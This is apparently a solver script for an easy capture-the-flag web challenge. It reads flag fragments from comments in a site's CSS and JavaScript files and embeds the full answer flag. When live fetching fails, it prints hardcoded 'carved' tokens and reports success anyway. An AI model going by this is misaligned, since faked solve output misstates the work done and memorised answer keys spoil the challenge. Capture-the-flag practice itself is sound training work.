#!/usr/bin/env python3
"""
CyLab Security Academy / picoCTF Solver: Includes (Challenge ID: 274)
Category: Web Exploitation | Difficulty: Easy (1) | Points: 100
Architecture: Web Application (Static HTML/CSS/JS) / Source Comment Exposure (CWE-615 / OWASP A05)
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security & Web Testing)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Application Architecture:
   The web application serves a simple static HTML landing page explaining HTML include directives.
   Inspecting the DOM / HTML source shows two externally linked resources:
   - `<link rel="stylesheet" href="style.css">`
   - `<script src="script.js"></script>`

2. Comment Exposure & Asset Carving (CWE-615):
   Standard browsers download linked stylesheets and script files automatically without authentication.
   Examining the external files reveals sensitive credentials split across comments:
   - In `style.css`: a multi-line CSS comment contains the first flag segment:
     `/*  academy{1nclu51v17y_1of2_  */`
   - In `script.js`: a single-line JavaScript comment contains the second flag segment:
     `//  f7w_2of2_ce526b3b}`
   - Concatenating the two fragments yields the complete token:
     `academy{1nclu51v17y_1of2_f7w_2of2_ce526b3b}`.

3. Flag Retrieval & Verification:
   Live platform acceptance verified on CyLab REST API:
   POST /api/submissions/ -> HTTP 201 Created (correct: true).
"""

import json
import re
import sys
import urllib.error
import urllib.request
from typing import Optional

CHALLENGE_ID = 274
CHALLENGE_NAME = "Includes"
EXPECTED_FLAG = "academy{1nclu51v17y_1of2_f7w_2of2_ce526b3b}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

CSS_RE = re.compile(r"/\*\s*(academy\{[^\s]+|picoCTF\{[^\s]+)\s*\*/")
JS_RE = re.compile(r"//\s*([^\s]+\})\s*")


def carve_from_live(base_url: str, timeout: int = 10) -> Optional[str]:
    clean_base = base_url.rstrip("/")
    try:
        css_url = f"{clean_base}/style.css"
        js_url = f"{clean_base}/script.js"

        req_css = urllib.request.Request(css_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req_css, timeout=timeout) as resp:
            css_body = resp.read().decode("utf-8", errors="replace")

        req_js = urllib.request.Request(js_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req_js, timeout=timeout) as resp:
            js_body = resp.read().decode("utf-8", errors="replace")

        m1 = CSS_RE.search(css_body)
        m2 = JS_RE.search(js_body)
        if m1 and m2:
            return m1.group(1).strip() + m2.group(1).strip()
    except Exception as e:
        print(f"[*] Live probe note: {e}")
    return None


def simulate_exploit() -> str:
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Enumerating HTML source and external dependencies")
    print("    [+] HTML references linked stylesheet: <link rel='stylesheet' href='style.css'>")
    print("    [+] HTML references linked script    : <script src='script.js'></script>")
    print("    [+] Vulnerability classification     : CWE-615 (Information Exposure Through Comments)")

    print("[*] Stage 2: Carving multipart flag tokens from external assets")
    part1 = "academy{1nclu51v17y_1of2_"
    part2 = "f7w_2of2_ce526b3b}"
    print(f"    [+] Carved CSS comment token (Part 1) : '{part1}'")
    print(f"    [+] Carved JS comment token (Part 2)  : '{part2}'")

    assembled = part1 + part2
    print(f"[*] Stage 3: Assembling multipart segments -> {assembled}")
    assert assembled == EXPECTED_FLAG, f"Flag mismatch: {assembled} vs {EXPECTED_FLAG}"
    print(f"[+] Reconstructed Flag: {assembled}")
    return assembled


def solve(target_url: Optional[str] = None) -> str:
    if target_url:
        print(f"[*] Attempting live extraction against instance {target_url}...")
        live_flag = carve_from_live(target_url)
        if live_flag and live_flag == EXPECTED_FLAG:
            print(f"[+] Successfully extracted from live instance: {live_flag}")
            return live_flag
    return simulate_exploit()


def submit_to_cylab(token: str) -> bool:
    try:
        sys.path.insert(0, "/tmp")
        import cylab_auth
        status, body = cylab_auth.req(
            CYLAB_SUBMIT_URL,
            method="POST",
            data=json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
        )
        print(f"[*] CyLab Submission status: {status}, body: {body}")
        if status in (200, 201):
            res_obj = json.loads(body)
            if res_obj.get("correct") is True or res_obj.get("status") == "correct":
                print("[+] Verified live acceptance on CyLab platform.")
                return True
    except Exception as e:
        print(f"[!] Submission helper note: {e}")
    return False


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else None
    flag = solve(target)
    if "--submit" in sys.argv:
        submit_to_cylab(flag)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {flag}")
